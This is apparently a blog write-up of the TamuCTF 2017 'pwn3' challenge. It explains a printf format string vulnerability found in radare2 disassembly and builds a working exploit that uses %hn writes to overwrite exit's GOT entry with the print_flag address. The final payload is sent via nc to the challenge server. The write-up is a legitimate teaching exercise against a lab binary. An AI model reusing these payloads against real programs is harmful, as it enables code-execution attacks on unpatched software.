---
author:
  email: tzaoh1@gmail.com
  github: https://github.com/tzaoh
  image:
  - /images/avatar-64x64.png
  name:
  - Tzaoh
cardbackground: 'white'
cardtitlecolor: 'orange'
post_categories:
- CTFs
date: 2017-08-10T18:56:18+02:00
description: TamuCTF 2017 - pwn3
tags:
- CTF
- TamuCTF
- 2017
title: "TamuCTF 2017 - Pwn 3"
summary: "Here we are, with another pwning challenge. Let's start :grin:."
cardthumbimage: "/assets/TamuCTF2017/title.png"
---

![Pwn3 challenge description](/assets/TamuCTF2017/pwn3/1-pwn3_description.png)

And here we are, with another pwning challenge :grin:.

```bash
$ wget -q https://github.com/BlackHoods/BlackHoods.github.io/tree/master/assets/TamuCTF2017/pwn3
$ r2 pwn3
```

Once downloaded and opened with radare2, go for it and list its functions.

{{< highlight r2 "hl_lines=25 26" >}}
[0x080484b0]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[x] Use -AA or aaaa to perform additional experimental analysis.
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[0x080484b0]> afl
0x080483d0    3 35           sym._init
0x08048410    1 6            sym.imp.printf
0x08048420    1 6            sym.imp.gets
0x08048430    1 6            sym.imp._IO_getc
0x08048440    1 6            sym.imp.puts
0x08048450    1 6            sym.imp.exit
0x08048460    1 6            sym.imp.__libc_start_main
0x08048470    1 6            sym.imp.setvbuf
0x08048480    1 6            sym.imp.fopen
0x08048490    1 6            sym.imp.putchar
0x080484a0    1 6            sub.__gmon_start___252_4a0
0x080484b0    1 33           entry0
0x080484e0    1 4            sym.__x86.get_pc_thunk.bx
0x080484f0    4 43           sym.deregister_tm_clones
0x08048520    4 53           sym.register_tm_clones
0x08048560    3 30           sym.__do_global_dtors_aux
0x08048580    4 43   -> 40   sym.frame_dummy
0x080485ab    4 103          sym.print_flag
0x08048612    1 102          sym.main
0x08048680    4 93           sym.__libc_csu_init
0x080486e0    1 2            sym.__libc_csu_fini
0x080486e4    1 20           sym._fini
[0x080484b0]> 
{{< /highlight >}}

```r2
[0x080484b0]> axt sym.print_flag
[0x080484b0]>
```

If you have read the [previous]({{< relref "post/TamuCTF2017/pwn2.md" >}}) challenge you may suspect that this one is a bit strange. Aparently, there is a function (`sym.print_flag`) that prints a flag and it is never called, just like [pwn2]({{< relref "post/TamuCTF2017/pwn2.md" >}}).  
Why do we have the exact same challenge again? something must be different.

Lets start checking what is happening inside the `main function.

{{< highlight r2 "hl_lines=32 38 43" >}}
[0x080484b0]> pdf @ sym.main 
            ;-- main:
┌ (fcn) sym.main 102
│   sym.main ();
│           ; var int local_208h @ ebp-0x208
│           ; var int local_4h @ esp+0x4
│              ; DATA XREF from 0x080484c7 (entry0)
│           0x08048612      8d4c2404       ecx = [local_4h]            
│           0x08048616      83e4f0         esp &= 0xfffffff0           
│           0x08048619      ff71fc         push dword [ecx - 4]        
│           0x0804861c      55             push ebp                    
│           0x0804861d      89e5           ebp = esp                   
│           0x0804861f      51             push ecx                    
│           0x08048620      81ec04020000   esp -= 0x204                
│           0x08048626      a138a00408     eax = dword obj.stdout      
│           0x0804862b      6a00           push 0                      
│           0x0804862d      6a00           push 0                      
│           0x0804862f      6a02           push 2                      
│           0x08048631      50             push eax                    
│         ; int setvbuf(FILE*stream, char*buf, int mode, size_t size)
│           0x08048632      e839feffff     sym.imp.setvbuf ()          
│           0x08048637      83c410         esp += 0x10                 
│           0x0804863a      83ec0c         esp -= 0xc                  
│           0x0804863d      682d870408     push str.Enter_a_word_to_be_echoed:
│         ; int puts(const char *s)
│           0x08048642      e8f9fdffff     sym.imp.puts ()             
│           0x08048647      83c410         esp += 0x10                 
│           0x0804864a      83ec0c         esp -= 0xc                  
│           0x0804864d      8d85f8fdffff   eax = [local_208h]          
│           0x08048653      50             push eax                    
│         ; char*gets(char *s)
│           0x08048654      e8c7fdffff     sym.imp.gets ()             
│           0x08048659      83c410         esp += 0x10                 
│           0x0804865c      83ec0c         esp -= 0xc                  
│           0x0804865f      8d85f8fdffff   eax = [local_208h]          
│           0x08048665      50             push eax                    
│         ; int printf(const char *format)
│           0x08048666      e8a5fdffff     sym.imp.printf ()           
│           0x0804866b      83c410         esp += 0x10                 
│           0x0804866e      83ec0c         esp -= 0xc                  
│           0x08048671      6a00           push 0                      
│         ; void exit(int status)
└           0x08048673      e8d8fdffff     sym.imp.exit ()             
{{< /highlight >}}

Well, it seems the execution is pretty straightforward:

1. Using `gets` function it saves your input in the memory address `local_208` is pointing to.

2. After that, `printf` is called pushing eax to the stack as a parameter.

3. And finally `exit` is called.


We can extract the following conclusions:

1. This time `print_flag` is not being called under some obscure conditional (like in [pwn1]({{< relref "post/TamuCTF2017/pwn1.md" >}})), so there is no variable to be altered.

2. There is no internal function to be called, so we can not try to overwrite EIP either (like in [pwn2]({{< relref "post/TamuCTF2017/pwn2.md" >}})).

But, wait a moment, that `printf call is a bit strange.

{{< highlight r2 "hl_lines=5 6 7" >}}
[0x080484b0]> pd 5 @ 0x08048659
│           0x08048659      83c410         esp += 0x10                 
│           0x0804865c      83ec0c         esp -= 0xc                  
│           0x0804865f      8d85f8fdffff   eax = [local_208h]          
│           0x08048665      50             push eax         
│         ; int printf(const char *format)            
│           0x08048666      e8a5fdffff     sym.imp.printf ()
{{< /highlight >}}

One push!  
Thats strange because normally `printf` accepts two arguments at least. It should look something like this:

![Pwn3 challenge description](/assets/TamuCTF2017/pwn3/4-pwn3_printf_correct_vs_incorrect_call.png)  
If user input is used as the first argument of `printf`, it means that the input will be interpreted as the format string itself.

> Aham, but... what implications does it have?

Well, with normals inputs, `printf` will behave "corretly", BUT look what happens if you provide format modifiers in your input (`input = "%p %p %p %p"`):

```bash
$ ./pwn3 
Enter a word to be echoed:
%p %p %p %p
0x2 (nil) (nil) 0x25207025
```

`printf` is leaking information of the stack!  
We are being able to see the content of the stack remotely!

> That's fantastic. Really, but this is not useful for our case right? I mean, we actually need to write stuff, not just read it.

Yeah, that's 100% right. But writing is still possible, just a bit more complex. I will try to explain it as simple as I can.

#### Writing in memory with format string attacks.

The corner stone of writing in memory using format string attacks is the format modifier `%n`.  
`%n` modifier writes **the LENGTH of the string** in the address provided by the user **BEFORE** the modifier itself.

Lets see an example:

```cpp
int c;
printf("12345 %n blah\n", &c);
// Here c will be 6 because "12345 " is 6 bytes length!
```

So, lets try all of this out, the idea is to send a memory address, locate where is it into the stack and use the `%n` format parameter to save data in the memory address we provide.

We will input 4 As ("AAAA", which will be written in memory as `0x41414141` and will be easier to locate) and several `%p` to see the stack content and find out where the "AAAA" string is allocated inside of the stack.

```bash
$ python -c 'print("AAAA" + "%p %p %p %p %p ")' | ./pwn3; echo
Enter a word to be echoed:
AAAA0x2 (nil) (nil) 0x41414141 0x25207025
```

Good, it is in the 4<sup>th</sup> `%p`. But imagine if the address was in the 300<sup>th</sup> position. We had to write 300 times `%p`!

> What a mess! what then?

Indeed, It does exist another way of printing that 4<sup>th</sup> value much more convenient for us: the index operator. 

```bash
$ python -c 'print("AAAA" + "%4$p")' | ./pwn3; echo
Enter a word to be echoed:
AAAA0x41414141
```

Basically using `<number>$` we are able to select the position of the data we want to select.

> Good! now we know that the address we need to write to is stored in the 4<sup>th</sup> position. what now?

Obviously `0x41414141` is not the address we are interested in. We need to find an address whose content is worth modifying.  
Here is where the GOT table enters in scene.


#### GOT (Global Offset Table)

In order to save memory, programs use shared libraries and the functions they contain. That way the same function does not need to be on every process but can be used on all of them.

The GOT is a table every process has inside and the addresses it contains points to the addresses of these shared functions.

Because all of these functions are being used inside our binary, we could try to modify the value which points to one of them, this way we will be able to alter the flow of the execution.
For that, we need to know, the specific function (and its address) of the GOT we want to modify. The following command will help us with that task.

```bash
$ objdump -R pwn3

pwn3:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049ffc R_386_GLOB_DAT    __gmon_start__
0804a038 R_386_COPY        stdout@@GLIBC_2.0
0804a00c R_386_JUMP_SLOT   printf@GLIBC_2.0
0804a010 R_386_JUMP_SLOT   gets@GLIBC_2.0
0804a014 R_386_JUMP_SLOT   _IO_getc@GLIBC_2.0
0804a018 R_386_JUMP_SLOT   puts@GLIBC_2.0
0804a01c R_386_JUMP_SLOT   exit@GLIBC_2.0
0804a020 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
0804a024 R_386_JUMP_SLOT   setvbuf@GLIBC_2.0
0804a028 R_386_JUMP_SLOT   fopen@GLIBC_2.1
0804a02c R_386_JUMP_SLOT   putchar@GLIBC_2.0
```

But not all of them are good for us, the function to be replaced must be executed **AFTER** the vulnerable `printf` call.  
Radare2 will gave us this answer before.

{{< highlight r2 "hl_lines=6" >}}
│           0x08048666      e8a5fdffff     sym.imp.printf ()           
│           0x0804866b      83c410         esp += 0x10                 
│           0x0804866e      83ec0c         esp -= 0xc                  
│           0x08048671      6a00           push 0                      
│         ; void exit(int status)
└           0x08048673      e8d8fdffff     sym.imp.exit ()  
{{< /highlight >}}

We have a winner! exit() function.

Finally, we just need to know the value to write in that address. That value is nothing more than a memory address that contains the code we want to be executed. Could you imagine of what value it can be?
Lets check again the previous output of r2 :smiley: .

{{< highlight r2 "hl_lines=1" >}}
0x080485ab    4 103          sym.print_flag
0x08048612    1 102          sym.main
{{< /highlight >}}

> That's it! the address of `sym.print_flag`! (`0x080485ab`)

Ok, those were a lot of explanations, right? Lets review all we have, just to not get lost.

1. We have the place where the address will be stored: the 4<sup>th</sup> position:  
```bash
$ python -c 'print("AAAA" + "%4$p")' | ./pwn3; echo
```  
2. We have the address to write to (by the way, emember about the [endianess](https://en.wikipedia.org/wiki/Endianness)).
```bash
$ python -c 'print("\x1c\xa0\x04\x08" + "%4$p")' | ./pwn3; echo
```

3. And here comes the last obstacle: We need to write the hex value `0x080485ab` through the `%n` operator.  
We know `%n` can write the length of the string with preceeds itself into the provided address, so at a first glance we could think in writing `134,514,087` characters (`134,514,091 - 4` because we already wrote a 4-byte address):
```bash
$ python -c 'print("\x1c\xa0\x04\x08" + "A"*134514087 + "%4$n")' | ./pwn3; echo
Enter a word to be echoed:
Traceback (most recent call last):
  File "<string>", line 1, in <module>
IOError: [Errno 32] Broken pipe
Segmentation fault
```

But aparently that is just to much for the pipe.  
We could try the `%<times>x` parameter. It just print as many memory bytes as we tell it to, so we do not have to generate them with python. 
```bash
$ python -c 'print("\x1c\xa0\x04\x08" + "%134514087x" + "%4$n")' | ./pwn3; echo
```

Meh! too much too.  
But wait a moment, there is a special paramater `%h` which does the following:

> Specifies that a following d, i, o, u, x, or X conversion specifier applies to a short int or unsigned short int argument (the argument will have been promoted according to the integer promotions, but its value shall be converted to short int or unsigned short int before printing); **or that a following n conversion speciﬁer applies to a pointer to a short int argument**.  -- C is For C Programming - Cask J. Thomson

Basically we can use this to convert a 4-bytes datatype into a 2-byte one.
We can use it to save our big value in two times. First we will save one half and then the other half.  
Let's represent this.
    
![Pwn3 Scheme](/assets/TamuCTF2017/pwn3/12-pwn3_scheme.png)    
    
Then, it makes sense that the first value to be written should be the lowest one `0x804-8 = 2044` in the address `0x0804a01e` which will be stored in the `4th` position of the stack.

```bash
$ python -c 'print("\x1e\xa0\x04\x08" + "addr2" + "%2044x" + "%4$hn" + "%____x" + "%_$hn")'
```
The second value to be written is the biggest one `0x85ab - (2044 + 8) = 32167` in the address `0804a01c` which will be stored in the `5th` position of the stack.

```bash
$ python -c 'print("\x1e\xa0\x04\x08" + "\x1c\xa0\x04\x08" + "%2044x" + "%4$hn" + "%32167x" + "%5$hn")'
```

Finally! lets try it!

```bash
$ python -c 'print("\x1e\xa0\x04\x08" + "\x1c\xa0\x04\x08" + "%2044x" + "%4$hn" + "%32167x" + "%5$hn")' | nc pwn.ctf.tamu.edu 4323
                                                                                                                                                                                                                                      0This function has been deprecated
gigem{F0RM@1NG_1S_H4RD}

Segmentation fault

```

Answer: gigem{F0RM@1NG_1S_H4RD}

### Complete video

<a href="https://asciinema.org/a/8dtrs5jltesk48y8ch5ouwrkn?autoplay=1" target="_blank"><img src="https://asciinema.org/a/8dtrs5jltesk48y8ch5ouwrkn.png" /></a>


### Tools used and some references:

 * [radare2](https://github.com/radare/radare2) - To analyze the binary.
 * [draw.io](https://www.draw.io/) - To draw some graphics.
 * [asciinema](https://asciinema.org) - To record the session.
 * [PicoCTF format string challenge](https://0x00sec.org/t/picoctf-write-up-bypassing-aslr-via-format-string-bug/1920)
 * [C is For C Programming - Cask J. Thomson (Fragment)](https://books.google.es/books?id=qeWyAAAAQBAJ&lpg=PA120&ots=Yk45UQR7EU&dq=Speci%EF%AC%81es%20that%20a%20following%20d%2C%20i%2C%20o%2C%20u%2C%20x%2C%20or%20X%20conversion%20speci%EF%AC%81er%20applies%20to%20a%20short%20int%20or%20unsigned%20short%20int%20argument%20(the%20argument%20will%20have%20been%20promoted%20according%20to%20the%20integer%20promotions%2C%20but%20its%20value%20shall%20be%20converted%20to%20short%20int%20or%20unsigned%20short%20int%20before%20printing)%3B%20or%20that%20a%20following%20n%20conversion%20speci%EF%AC%81er%20applies%20to%20a%20pointer%20to%20a%20short%20int%20argument.&hl=es&pg=PA120#v=onepage&q&f=false)


#### Some notes for the author

```bash
$ r2 -R "stdin=\"`python -c 'print(\"\x1e\xa0\x04\x08\x1c\xa0\x04\x08\" + \"%2044x%4$hn\" + \"%32167x%5$hn\")'`\"" -d pwn3
```
